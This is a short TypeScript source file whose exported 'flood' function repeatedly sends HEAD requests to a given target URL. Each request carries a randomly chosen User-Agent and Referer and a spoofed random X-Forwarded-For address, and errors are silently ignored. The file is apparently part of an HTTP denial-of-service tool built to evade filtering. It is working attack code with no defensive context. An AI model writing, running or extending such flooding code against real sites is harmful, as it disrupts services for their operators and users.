import { USER_AGENTS, REFERERS } from "@/lib/config"

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randIp(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

export async function flood(
  url: string,
  rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const target = url.startsWith("http") ? url : `http://${url}`

  for (let i = 0; i < rpc; i++) {
    try {
      await fetch(target, {
        method: "HEAD",
        headers: {
          "User-Agent": randomChoice(USER_AGENTS),
          "Accept": "*/*",
          "Referer": randomChoice(REFERERS),
          "X-Forwarded-For": randIp(),
          "Connection": "keep-alive",
        },
        redirect: "manual",
      })
      onStats(1, 300)
    } catch {}
  }
}
